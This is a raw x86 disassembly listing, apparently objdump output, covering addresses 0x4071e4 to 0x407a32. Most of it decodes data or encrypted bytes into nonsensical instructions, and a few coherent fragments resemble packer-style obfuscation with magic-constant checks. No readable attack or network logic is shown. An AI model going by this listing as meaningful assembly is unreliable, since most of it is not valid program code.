  4071e4:	mul    DWORD PTR [edi]
  4071e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e7:	sti    
  4071e8:	inc    edx
  4071e9:	or     ch,dl
  4071eb:	and    DWORD PTR [eax],ebx
  4071ed:	test   eax,0x10670d96
  4071f2:	inc    ebx
  4071f3:	xchg   esp,eax
  4071f4:	retf   0x2fcc
  4071f7:	sbb    eax,0x2d2c9cd4
  4071fc:	fild   WORD PTR [ebx+0x1d]
  4071ff:	aas    
  407200:	pop    edi
  407201:	cmp    al,0x84
  407203:	(bad)
  407206:	int3   
  407207:	pop    eax
  407208:	or     BYTE PTR [ecx+eiz*4],dl
  40720b:	mov    BYTE PTR [edi+0x6dc023c8],dh
  407211:	jb     0x407234
  407213:	inc    esi
  407214:	cld    
  407215:	add    ch,cl
  407217:	test   DWORD PTR [edx-0x20bfa474],edx
  40721d:	cli    
  40721e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40721f:	das    
  407220:	test   DWORD PTR [edx+esi*1-0x12334d42],edx
  407227:	test   bl,bl
  407229:	ja     0x40722b
  40722b:	lahf   
  40722c:	adc    cl,BYTE PTR [eax-0x44aadce0]
  407232:	cwde   
  407233:	cwde   
  407234:	mov    edx,0x857649da
  407239:	lock mov al,ds:0x620437c4
  40723f:	fwait
  407240:	push   ss
  407241:	cld    
  407242:	sbb    eax,0xad4468d4
  407247:	lds    ebp,FWORD PTR gs:[edi]
  40724a:	mov    DWORD PTR [di-0x2c],0x4f39
  407252:	mov    DWORD PTR ds:0x43446f,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x43445f,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434593,0x434463
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434487
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x43447b,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x4344cb,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x4344bb,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x43456f
  4072cc:	mov    eax,ds:0x4345b3
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x8907a48
  4072fa:	sub    bl,BYTE PTR [edx]
  4072fc:	pusha  
  4072fd:	aas    
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x4072ec
  407306:	fadd   DWORD PTR [ebx]
  407308:	jnp    0x4072c2
  40730a:	cmp    al,0xe
  40730c:	aad    0x98
  40730e:	fcom   DWORD PTR [edi-0x71]
  407311:	mov    ds,ebx
  407313:	cs std 
  407315:	push   eax
  407316:	lea    ebp,[eax+0x664d8778]
  40731c:	cwde   
  40731d:	cmp    BYTE PTR [edi],bl
  40731f:	cmp    eax,0x97da70d1
  407324:	jmp    0x4072f9
  407326:	cmp    al,0x7e
  407328:	mov    al,0x7b
  40732a:	adc    bh,BYTE PTR [edx+0x6f19583d]
  407330:	xlat   BYTE PTR ss:[ebx]
  407332:	retf   0x190d
  407335:	adc    ebp,DWORD PTR [edi-0x1a]
  407338:	(bad)  
  40733a:	and    al,BYTE PTR [esi+0x6e]
  40733d:	jmp    0x4d5ea3f3
  407342:	fidiv  WORD PTR [ebx-0x25d9a715]
  407348:	push   eax
  407349:	add    al,0xef
  40734b:	out    0x68,eax
  40734d:	lock cmp BYTE PTR [ecx],dl
  407350:	pop    eax
  407351:	mul    BYTE PTR [ecx]
  407353:	mov    esi,0xf13d1c5c
  407358:	inc    ebx
  407359:	and    al,0xa4
  40735b:	push   ebx
  40735c:	mov    DWORD PTR [edx],esi
  40735e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40735f:	jge    0x40733b
  407361:	push   0x55
  407363:	pop    ebx
  407364:	jecxz  0x407335
  407366:	call   0xa604:0xfa3dade6
  40736d:	inc    esp
  40736e:	(bad)  
  407370:	inc    eax
  407371:	fs cdq 
  407373:	mov    ch,0xf3
  407375:	mov    ds:0xf6759c81,eax
  40737a:	mov    edi,0x4b81838a
  40737f:	add    edx,DWORD PTR [edx]
  407381:	push   es
  407382:	pop    ds
  407383:	push   ss
  407384:	ss mov cl,0xff
  407387:	ret    
  407388:	dec    ebx
  407389:	push   edi
  40738a:	gs push edx
  40738c:	or     al,BYTE PTR [ecx+0x69]
  40738f:	push   ebx
  407390:	call   0x2783e6a4
  407395:	inc    ebx
  407396:	sbb    ecx,DWORD PTR [edx+0x15]
  407399:	ret    
  40739a:	push   esi
  40739b:	cmp    edi,ebp
  40739d:	pop    edi
  40739e:	(bad)  
  40739f:	stc    
  4073a0:	adc    al,0x18
  4073a2:	fsubr  QWORD PTR [edi+0x310d5b57]
  4073a8:	pop    esi
  4073a9:	aam    0x75
  4073ab:	sub    DWORD PTR [edx],ebp
  4073ad:	bound  ecx,QWORD PTR [ecx+0x625861cb]
  4073b3:	mov    cl,0x90
  4073b5:	add    al,0x59
  4073b7:	aam    0xf8
  4073b9:	sub    edi,esi
  4073bb:	in     al,dx
  4073bc:	adc    al,0x15
  4073be:	in     al,0x43
  4073c0:	cwde   
  4073c1:	inc    edi
  4073c2:	ds xor al,0x21
  4073c5:	cmp    eax,0x9c41af0b
  4073ca:	cmp    al,0xb
  4073cc:	inc    edi
  4073cd:	inc    edx
  4073ce:	jl     0x407424
  4073d0:	add    BYTE PTR [esi-0x55d39dc9],bh
  4073d6:	mov    ds:0xaf372cbb,eax
  4073db:	add    al,0xd4
  4073dd:	jl     0x407419
  4073df:	imul   eax,esp,0x539a60d8
  4073e5:	ret    
  4073e6:	jo     0x4073d8
  4073e8:	mov    ?,esi
  4073ea:	data16 jns 0x40739e
  4073ed:	fisttp WORD PTR [ebp-0xd1ecb54]
  4073f3:	mov    dh,0x9d
  4073f5:	add    DWORD PTR [ebx-0x16],eax
  4073f8:	fs cdq 
  4073fa:	pop    esp
  4073fb:	mov    esi,0x832a0ed2
  407400:	cwde   
  407401:	ds mov ch,bh
  407404:	and    DWORD PTR [eax-0x612c5a65],eax
  40740a:	pop    edx
  40740b:	add    BYTE PTR [edx-0x34],ah
  40740e:	sbb    BYTE PTR [edx+0x274b7b79],dl
  407414:	sub    al,0x8a
  407416:	pop    ebx
  407417:	(bad)  
  407418:	scas   eax,DWORD PTR es:[edi]
  407419:	je     0x407468
  40741b:	inc    ecx
  40741c:	pop    eax
  40741d:	test   DWORD PTR [edi+0x3d1aeff4],0xa463e79e
  407427:	pop    ebp
  407428:	neg    DWORD PTR [ebx]
  40742a:	push   esp
  40742b:	or     DWORD PTR ds:0xa2e96789,0xbff09b03
  407435:	xor    DWORD PTR [edi-0x66],edi
  407438:	(bad)  
  407439:	cmc    
  40743a:	shl    BYTE PTR [edx-0x15],1
  40743d:	fs test eax,0xb7393a9f
  407443:	inc    ebx
  407444:	out    dx,eax
  407445:	scas   al,BYTE PTR es:[edi]
  407446:	ds push 0x6c22d67f
  40744c:	test   eax,0x1467c383
  407451:	cli    
  407452:	popf   
  407453:	xchg   esi,eax
  407454:	inc    ecx
  407455:	cmp    DWORD PTR [esi-0x7a87974f],eax
  40745b:	sti    
  40745c:	xor    DWORD PTR [esi],edi
  40745e:	dec    eax
  40745f:	cpuid  
  407461:	xor    DWORD PTR [esi-0x34433464],edi
  407467:	xlat   BYTE PTR ds:[ebx]
  407468:	adc    al,0x63
  40746a:	xchg   ebp,eax
  40746b:	inc    edx
  40746c:	push   0x4f
  40746e:	xchg   esi,eax
  40746f:	sub    eax,0xab89444e
  407474:	fstp   DWORD PTR [ebp-0xc]
  407477:	fiadd  WORD PTR [edx]
  407479:	adc    al,BYTE PTR [edx+0xd]
  40747c:	(bad)  
  40747d:	cs clc 
  40747f:	or     esp,ebp
  407481:	outs   dx,DWORD PTR ds:[esi]
  407482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407483:	xchg   DWORD PTR [edx+0x2f],ecx
  407486:	lds    eax,FWORD PTR ds:0x9ff13eb4
  40748c:	mov    ebp,0xdc3f8f99
  407491:	mov    eax,0x9d33078f
  407496:	je     0x407422
  407498:	jmp    0x4074a1
  40749a:	mov    ecx,0x979e16ac
  40749f:	out    dx,al
  4074a0:	pop    ebx
  4074a1:	add    cl,dh
  4074a3:	xor    ebp,DWORD PTR ds:0xa4380dcb
  4074a9:	sbb    al,0x4d
  4074ab:	jns    0x4074e1
  4074ad:	jb     0x40747b
  4074af:	gs loop 0x407449
  4074b2:	cmp    eax,0xb1a2860b
  4074b7:	leave  
  4074b8:	mov    ds:0x74e59cc6,al
  4074bd:	rcl    DWORD PTR [edi+0x3e8fc4a1],1
  4074c3:	lods   al,BYTE PTR ds:[esi]
  4074c4:	cwde   
  4074c5:	adc    eax,DWORD PTR [eax]
  4074c7:	leave  
  4074c8:	cmp    ecx,DWORD PTR [edi+0x4d]
  4074cb:	or     al,0x47
  4074cd:	mov    ah,0xf7
  4074cf:	popf   
  4074d0:	sbb    esi,edx
  4074d2:	mov    al,ds:0x8e6bec0e
  4074d7:	sub    ch,BYTE PTR [esi+0xe383c84]
  4074dd:	jmp    0x2389b197
  4074e2:	push   0xb97bc508
  4074e7:	sbb    al,0x9a
  4074e9:	or     eax,0xe0f7f112
  4074ee:	or     DWORD PTR [ecx],esp
  4074f0:	repz rol DWORD PTR [ecx+0x6],1
  4074f4:	mov    esp,0x62ae4bd3
  4074f9:	cmp    DWORD PTR [edi-0x1851ee01],ecx
  4074ff:	div    DWORD PTR [ebp+0x4f7de029]
  407505:	in     al,0xc7
  407507:	mov    DWORD PTR [edi],edi
  407509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40750a:	sti    
  40750b:	push   eax
  40750c:	mov    edi,0xfa6a0524
  407511:	push   ebx
  407512:	out    dx,eax
  407513:	add    bl,BYTE PTR [ebp+eax*4-0x75]
  407517:	sbb    DWORD PTR [eax+eiz*4-0x612408d5],0xffffffc5
  40751f:	fwait
  407520:	int    0xa8
  407522:	ret    0xdc05
  407525:	ins    BYTE PTR es:[edi],dx
  407526:	sub    DWORD PTR [ebp+0x74c3142f],eax
  40752c:	jns    0x40751c
  40752e:	jb     0x407538
  407530:	cmp    al,0x7b
  407532:	leave  
  407533:	dec    ebp
  407534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407535:	adc    BYTE PTR [edx-0x5d],ch
  407538:	pop    ss
  407539:	test   DWORD PTR [edi-0x7d],ebx
  40753c:	push   0xffffffd7
  40753e:	add    eax,0x977401cf
  407543:	inc    edi
  407544:	sub    eax,DWORD PTR [edx-0x4341f1f5]
  40754a:	test   al,0x5c
  40754c:	aaa    
  40754d:	je     0x407516
  40754f:	or     eax,0x6771a862
  407554:	repz push edx
  407556:	in     eax,dx
  407557:	mov    ebx,0xe233a9fd
  40755c:	add    DWORD PTR [edx-0x42],ebp
  40755f:	jne    0x407588
  407561:	shr    BYTE PTR [ebx],1
  407563:	mov    ds:0xaa11f878,eax
  407568:	xlat   BYTE PTR ds:[ebx]
  407569:	push   ecx
  40756a:	enter  0x36ea,0xe1
  40756e:	je     0x407535
  407570:	fdivr  QWORD PTR [eax]
  407572:	ins    DWORD PTR es:[edi],dx
  407573:	sbb    bh,0x1d
  407576:	pop    edi
  407577:	sub    eax,0xd212a0dd
  40757c:	jb     0x4075c8
  40757e:	xchg   esi,eax
  40757f:	popf   
  407580:	xchg   BYTE PTR [esi],bh
  407582:	or     esi,DWORD PTR [eax]
  407584:	jno    0x4075ed
  407586:	or     eax,DWORD PTR [ecx-0x19]
  407589:	les    ebx,FWORD PTR [esi]
  40758b:	pushf  
  40758c:	mov    al,ds:0x40ed24c7
  407591:	aad    0x9e
  407593:	les    esi,FWORD PTR [ecx-0x76cc7fe5]
  407599:	test   DWORD PTR [edi-0x38],esp
  40759c:	popa   
  40759d:	rcr    cl,0xf9
  4075a0:	popa   
  4075a1:	out    dx,eax
  4075a2:	aaa    
  4075a3:	xchg   ebx,eax
  4075a4:	pop    esi
  4075a5:	hlt    
  4075a6:	test   al,0xf1
  4075a8:	mov    ebp,0xe5690f9d
  4075ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ae:	mov    al,dh
  4075b0:	push   0xffffffbd
  4075b2:	adc    al,0x60
  4075b4:	sti    
  4075b5:	mov    DWORD PTR [ecx+eiz*1+0xa6fb093],esi
  4075bc:	sbb    DWORD PTR [ebx-0x5a7470dc],0x19
  4075c3:	shr    BYTE PTR [edx-0x58],cl
  4075c6:	adc    ebx,DWORD PTR [edi-0x516b7ac7]
  4075cc:	and    DWORD PTR [esi-0x6915817f],edx
  4075d2:	mov    esp,0x7d0b9cf2
  4075d7:	push   ebp
  4075d8:	inc    esi
  4075d9:	xchg   DWORD PTR [esi],ebx
  4075db:	adc    DWORD PTR [edx-0xa],ebx
  4075de:	push   esp
  4075df:	add    ah,cl
  4075e1:	mov    ah,0x27
  4075e3:	xor    DWORD PTR ds:0xdb317939,ebx
  4075e9:	iret   
  4075ea:	add    al,0xf0
  4075ec:	xor    ecx,DWORD PTR [edi-0x2d4204d8]
  4075f2:	add    al,0x4e
  4075f4:	sbb    dl,0x4b
  4075f7:	dec    edx
  4075f8:	sub    esp,0xfd5dbc6c
  4075fe:	cmpps  xmm1,XMMWORD PTR [edi-0x41],0xb2
  407603:	xchg   ebx,eax
  407604:	fmul   DWORD PTR [ebp+ebp*2+0x3ab36e06]
  40760b:	mov    ds:0x52ec8895,al
  407610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407611:	daa    
  407612:	fdivr  DWORD PTR [edx]
  407614:	xchg   ecx,eax
  407615:	outs   dx,DWORD PTR ds:[esi]
  407616:	data16 ja 0x4075df
  407619:	xor    esi,DWORD PTR [ecx-0xb]
  40761c:	or     eax,0x73a502e3
  407621:	sub    BYTE PTR [eax+0x21],cl
  407624:	lahf   
  407625:	loope  0x407661
  407627:	ret    
  407628:	test   DWORD PTR [ebp-0x20f217f4],ecx
  40762e:	or     bl,cl
  407630:	mov    eax,ds:0xb24e44d9
  407635:	push   esp
  407636:	in     al,0x6d
  407638:	sbb    bh,BYTE PTR [ebx]
  40763a:	inc    edx
  40763b:	in     eax,dx
  40763c:	jp     0x4075c5
  40763e:	xor    BYTE PTR [ecx-0x75556dc2],ah
  407644:	fisubr WORD PTR [ecx]
  407646:	mov    cl,0x8
  407648:	xchg   ebp,eax
  407649:	(bad)  
  40764a:	adc    eax,0x336ad942
  40764f:	int    0x46
  407651:	stc    
  407652:	sbb    BYTE PTR ds:0x4d01d120,0x10
  407659:	pushf  
  40765a:	or     al,0x58
  40765c:	imul   edx,DWORD PTR [edi],0x5adcd5cd
  407662:	gs jbe 0x40762f
  407665:	or     ecx,DWORD PTR [ebp+0x21ce7704]
  40766b:	push   ebp
  40766c:	dec    ebx
  40766d:	pop    esp
  40766e:	mov    eax,esi
  407670:	stc    
  407671:	pop    esp
  407672:	fwait
  407673:	stos   DWORD PTR es:[edi],eax
  407674:	or     eax,0x86007f7a
  407679:	push   esi
  40767a:	test   DWORD PTR [edi-0x3190290b],edi
  407680:	js     0x407606
  407682:	adc    BYTE PTR [edx+0x33],ch
  407685:	cld    
  407686:	jns    0x4076a6
  407688:	jae    0x407620
  40768a:	into   
  40768b:	mov    WORD PTR ds:[edx],ss
  40768e:	outs   dx,BYTE PTR ds:[esi]
  40768f:	inc    esp
  407690:	test   al,0x7f
  407692:	nop
  407693:	sbb    al,0x5a
  407695:	mov    dl,0x6e
  407697:	sub    edi,ebp
  407699:	sub    ecx,edi
  40769b:	pop    es
  40769c:	add    al,BYTE PTR [ecx]
  40769e:	inc    ebp
  40769f:	stos   DWORD PTR es:[edi],eax
  4076a0:	imul   edx,DWORD PTR [ecx],0xa01af2b3
  4076a6:	shl    dh,cl
  4076a8:	out    dx,eax
  4076a9:	and    BYTE PTR [eax-0x739eddaf],dh
  4076af:	push   esi
  4076b0:	imul   ebp,edx,0x1900562d
  4076b6:	jl     0x407726
  4076b8:	jb     0x407644
  4076ba:	push   0xffffffdf
  4076bc:	push   cs
  4076bd:	or     al,0x32
  4076bf:	push   0x707e0469
  4076c4:	mov    al,0xb1
  4076c6:	daa    
  4076c7:	or     al,0x10
  4076c9:	comisd xmm6,QWORD PTR [eax+0x2d]
  4076ce:	xor    eax,DWORD PTR [edx]
  4076d0:	inc    ebx
  4076d1:	(bad)  
  4076d2:	jae    0x407712
  4076d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d5:	adc    al,0x5b
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x92a85797
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x407765
  40772b:	scas   al,BYTE PTR es:[edi]
  40772c:	das    
  40772d:	sub    DWORD PTR [edi+0x3a],esi
  407730:	fadd   QWORD PTR [edi+0x7c]
  407733:	imul   esi,edi,0x5cb3658e
  407739:	cmp    ebp,ebx
  40773b:	das    
  40773c:	fsub   DWORD PTR [edi-0x6b584d96]
  407742:	xchg   esi,eax
  407743:	mov    ds:0x98d4ff66,al
  407748:	mov    eax,ds:0xbc8a6cfe
  40774d:	or     al,0x1f
  40774f:	fist   WORD PTR [ebx+ebx*4+0x2d]
  407753:	nop
  407754:	dec    ebp
  407755:	stos   DWORD PTR es:[edi],eax
  407756:	(bad)  
  407757:	add    eax,0x57a65e4d
  40775c:	cmp    bh,BYTE PTR [edx-0x2ea7fff0]
  407762:	push   ecx
  407763:	and    dh,BYTE PTR [esi-0x7]
  407766:	jle    0x40771a
  407768:	lahf   
  407769:	cwde   
  40776a:	inc    edi
  40776b:	cld    
  40776c:	nop
  40776d:	test   eax,0xacb19dc3
  407772:	stc    
  407773:	cmc    
  407774:	fs mov esi,0xb70a5f60
  40777a:	and    ebx,ebp
  40777c:	aas    
  40777d:	mov    al,ds:0xc765caa6
  407782:	pop    esp
  407783:	int    0xfb
  407785:	test   al,0xb0
  407787:	std    
  407788:	jge    0x40773b
  40778a:	es nop
  40778c:	ffree  st(2)
  40778e:	(bad)  
  40778f:	adc    DWORD PTR [esi+esi*4],ebx
  407792:	push   esp
  407793:	stos   BYTE PTR es:[edi],al
  407794:	and    ecx,DWORD PTR [edi+0x7beb5ef1]
  40779a:	das    
  40779b:	in     eax,0x57
  40779d:	pop    eax
  40779e:	loopne 0x407736
  4077a0:	adc    eax,0x832f85e0
  4077a5:	xchg   ebx,eax
  4077a6:	sub    ecx,DWORD PTR [ebx+0x2d]
  4077a9:	pop    ds
  4077aa:	fldcw  WORD PTR [ecx+0x708bf298]
  4077b0:	data16 (bad) 
  4077b2:	mov    al,0x42
  4077b4:	rol    DWORD PTR [ebx+0x7],0x62
  4077b8:	cli    
  4077b9:	ins    DWORD PTR es:[edi],dx
  4077ba:	or     al,0x63
  4077bc:	adc    DWORD PTR [ebp+0xedcbfe5],edx
  4077c2:	std    
  4077c3:	inc    eax
  4077c4:	sub    eax,0xb1e4e0b9
  4077c9:	mov    esp,edi
  4077cb:	aad    0xda
  4077cd:	mov    dx,0x6f3b
  4077d1:	or     BYTE PTR [ebx-0x10],cl
  4077d4:	fsubr  DWORD PTR [esi-0x9]
  4077d7:	push   es
  4077d8:	mov    esp,fs
  4077da:	mov    al,0xec
  4077dc:	(bad)  
  4077dd:	sub    ebp,DWORD PTR [esi-0x4757d8c9]
  4077e3:	idiv   BYTE PTR [ebp+0x58]
  4077e6:	lods   al,BYTE PTR ds:[esi]
  4077e7:	retf   
  4077e8:	push   ds
  4077e9:	mov    dh,0x2
  4077eb:	xchg   edx,eax
  4077ec:	rcl    DWORD PTR [edi],0x11
  4077ef:	cmp    BYTE PTR [eax-0x4c567918],0x14
  4077f6:	pop    ds
  4077f7:	mov    ds:0xf1da438,al
  4077fc:	dec    ebx
  4077fd:	jns    0x407836
  4077ff:	xor    al,0x56
  407801:	cmp    ebx,ebx
  407803:	sub    esp,DWORD PTR [ebp-0x2e77c18a]
  407809:	mov    al,ds:0xa8879a76
  40780e:	push   0xffffffa7
  407810:	xor    eax,0x97628a48
  407815:	aas    
  407816:	les    eax,FWORD PTR [eax+0x6e]
  407819:	mov    dl,0x56
  40781b:	fdivr  DWORD PTR [esi-0x358473d]
  407821:	stos   BYTE PTR es:[edi],al
  407822:	and    DWORD PTR [esi-0x38786532],edi
  407828:	sub    al,0x24
  40782a:	dec    ebp
  40782b:	or     eax,0xa3a1c8cc
  407830:	and    al,0xd9
  407832:	adc    eax,0xc9ff9415
  407837:	(bad)  
  407838:	bound  eax,QWORD PTR [eax]
  40783a:	js     0x4077f3
  40783c:	jb     0x40784e
  40783e:	es add eax,0xaafa6c4
  407844:	or     ch,ch
  407846:	mov    eax,ds:0x1675d229
  40784b:	in     al,dx
  40784c:	(bad)  
  40784e:	mov    BYTE PTR [eax-0x21ad4fa5],al
  407854:	add    al,0xe9
  407856:	pop    esp
  407857:	cmp    al,BYTE PTR [ecx]
  407859:	test   al,cl
  40785b:	cmp    DWORD PTR [eax],edx
  40785d:	xor    al,0xd4
  40785f:	repnz sbb BYTE PTR [ebx-0x1a59691c],cl
  407866:	pop    eax
  407867:	repnz push 0x73
  40786a:	add    BYTE PTR [ebx+0xff923bd],bh
  407870:	idiv   ebx
  407872:	pop    ss
  407873:	jl     0x40783a
  407875:	lock add eax,edx
  407878:	mov    esi,0x8435cf1c
  40787d:	mov    al,ds:0x29f9b2d
  407882:	xchg   BYTE PTR [edx+0x53b603e8],dh
  407888:	out    0x75,al
  40788a:	pop    es
  40788b:	data16 stos BYTE PTR es:[edi],al
  40788d:	addr16 sti 
  40788f:	adc    al,0x36
  407891:	mov    esi,0xa583f9ff
  407896:	imul   edx,esi,0x31
  407899:	pop    es
  40789a:	fidiv  DWORD PTR [esi-0x74]
  40789d:	mov    dh,0xe
  40789f:	ds cmp eax,0xb29ffe01
  4078a5:	jae    0x407889
  4078a7:	mov    dh,0xa8
  4078a9:	inc    ebp
  4078aa:	es xor al,0x27
  4078ad:	xor    bh,BYTE PTR [ecx]
  4078af:	dec    ecx
  4078b0:	push   esi
  4078b1:	(bad)  
  4078b2:	loop   0x4078ec
  4078b4:	(bad)  
  4078b5:	int3   
  4078b6:	jl     0x40792f
  4078b8:	mov    ah,0xec
  4078ba:	fcomp  DWORD PTR [ebp+0x4141171c]
  4078c0:	scas   al,BYTE PTR es:[edi]
  4078c1:	imul   eax,DWORD PTR [edi+0x581802db],0xb524714d
  4078cb:	pop    edi
  4078cc:	fld    TBYTE PTR [esi-0x710a8736]
  4078d2:	dec    DWORD PTR [edx+0x54362113]
  4078d8:	adc    esi,esi
  4078da:	sub    edx,DWORD PTR [esi]
  4078dc:	push   eax
  4078dd:	ja     0x407880
  4078df:	jl     0x40792d
  4078e1:	add    al,0xb7
  4078e3:	and    cl,BYTE PTR [eax-0x7d]
  4078e6:	mov    eax,0x293bc7f9
  4078eb:	test   eax,0x7b8615f5
  4078f0:	add    ebx,esi
  4078f2:	les    edi,FWORD PTR [esi+0x14]
  4078f5:	stos   BYTE PTR es:[edi],al
  4078f6:	int3   
  4078f7:	mov    ebx,0x695a59f9
  4078fc:	sbb    BYTE PTR [eax+0x4565e48e],ch
  407902:	inc    eax
  407903:	fwait
  407904:	add    al,0xed
  407906:	adc    bl,ah
  407908:	mov    bh,BYTE PTR [esi+0x55e01f5b]
  40790e:	pushf  
  40790f:	push   ds
  407910:	inc    esp
  407911:	daa    
  407912:	stos   DWORD PTR es:[edi],eax
  407913:	xchg   esi,eax
  407914:	push   DWORD PTR [edi]
  407916:	(bad)  
  407917:	xchg   edx,eax
  407918:	adc    bl,BYTE PTR [eax]
  40791a:	icebp  
  40791b:	jo     0x407972
  40791d:	punpckldq mm0,DWORD PTR [esi-0x27364a76]
  407924:	scas   eax,DWORD PTR es:[edi]
  407925:	and    ah,BYTE PTR [ebp+0x41]
  407928:	dec    eax
  407929:	fadd   st,st(4)
  40792b:	add    BYTE PTR [edx],0x5f
  40792e:	les    esp,FWORD PTR [ebx+0x0]
  407931:	push   ecx
  407932:	fist   DWORD PTR ds:0xb9e4aa40
  407938:	aas    
  407939:	(bad)  
  40793b:	xor    ecx,ebx
  40793d:	cwde   
  40793e:	mov    edx,0x23d5edef
  407943:	add    dh,BYTE PTR [esi-0xb]
  407946:	lock jmp 0x5d6c:0x1e7e3ff9
  40794e:	aad    0x56
  407950:	hlt    
  407951:	shr    DWORD PTR [eax+0x3cd38b1d],1
  407957:	adc    al,0x37
  407959:	fidiv  DWORD PTR [ecx+0x2ab01de9]
  40795f:	ds addr16 add al,0x27
  407963:	add    dl,BYTE PTR [esi-0x7d]
  407966:	mov    dl,0x66
  407968:	loop   0x4079bf
  40796a:	sub    ebp,DWORD PTR [edx+eiz*4]
  40796d:	sar    DWORD PTR [edi+ebx*2+0x10],cl
  407971:	sbb    dl,cl
  407973:	iret   
  407974:	dec    ecx
  407975:	ret    0x20f4
  407978:	clc    
  407979:	or     DWORD PTR [ebx-0x4e],esi
  40797c:	out    0x6,al
  40797e:	jg     0x4079fb
  407980:	bound  esp,QWORD PTR [eax+0x22]
  407983:	pushf  
  407984:	sbb    edx,DWORD PTR [eax-0x5a]
  407987:	ss repnz (bad) 
  40798b:	int    0x8f
  40798d:	xor    eax,0xb3f4a37e
  407992:	inc    edx
  407993:	fst    DWORD PTR [ecx-0x1c]
  407996:	hlt    
  407997:	adc    al,0x7c
  407999:	rcl    BYTE PTR [esp+eax*4],0xa3
  40799d:	test   edi,esp
  40799f:	fld    QWORD PTR [ecx+eax*2-0x59b87742]
  4079a6:	out    0x44,al
  4079a8:	lds    eax,FWORD PTR [ebp-0x4c4d6966]
  4079ae:	ror    BYTE PTR [ebx+0x4ec2fa52],0x9c
  4079b5:	out    dx,al
  4079b6:	jg     0x407a05
  4079b8:	pop    esi
  4079b9:	std    
  4079ba:	repz jnp 0x40799c
  4079bd:	pop    ebx
  4079be:	retf   0xeb4e
  4079c1:	arpl   si,si
  4079c3:	adc    esi,DWORD PTR [ebx]
  4079c5:	jge    0x4079bd
  4079c7:	pop    ds
  4079c8:	iret   
  4079c9:	jns    0x407a0a
  4079cb:	sub    eax,0x29693180
  4079d0:	add    dl,cl
  4079d2:	scas   al,BYTE PTR es:[edi]
  4079d3:	xchg   edi,eax
  4079d4:	mov    DWORD PTR [edx],edi
  4079d6:	enter  0x7e85,0x30
  4079da:	ins    DWORD PTR es:[edi],dx
  4079db:	ins    BYTE PTR es:[edi],dx
  4079dc:	dec    edi
  4079dd:	dec    ebx
  4079de:	repz dec esp
  4079e0:	pop    edx
  4079e1:	clc    
  4079e2:	pushw  0x5
  4079e5:	aas    
  4079e6:	call   0x6795c6f2
  4079eb:	loop   0x40796f
  4079ed:	cwde   
  4079ee:	pop    esp
  4079ef:	es pusha 
  4079f1:	mov    esi,0x9d60de6e
  4079f6:	jmp    0x20d8:0xc24ecbe1
  4079fd:	sub    BYTE PTR [esi],cl
  4079ff:	cmp    al,0x9f
  407a01:	aad    0x16
  407a03:	bound  edi,QWORD PTR [edi+0x63]
  407a06:	scas   al,BYTE PTR es:[edi]
  407a07:	pop    esi
  407a08:	sbb    eax,0x5d0ffb3f
  407a0d:	in     al,dx
  407a0e:	ds add ebp,ebp
  407a11:	mov    dl,0x6d
  407a13:	mov    edx,0xee5130dd
  407a18:	push   edi
  407a19:	mov    ds:0x8fcaf4b6,eax
  407a1e:	stos   BYTE PTR es:[edi],al
  407a1f:	dec    eax
  407a20:	neg    ebp
  407a22:	mov    ss,WORD PTR [ebx]
  407a24:	inc    edi
  407a25:	scas   al,BYTE PTR es:[edi]
  407a26:	in     al,dx
  407a27:	xlat   BYTE PTR ds:[ebx]
  407a28:	rol    DWORD PTR [esi-0x76f94d89],cl
  407a2e:	push   es
  407a2f:	cwde   
  407a30:	jo     0x407a85
  407a32:	adc    DWORD PTR [ebx+ebp*2-0x29e0a50d],ecx
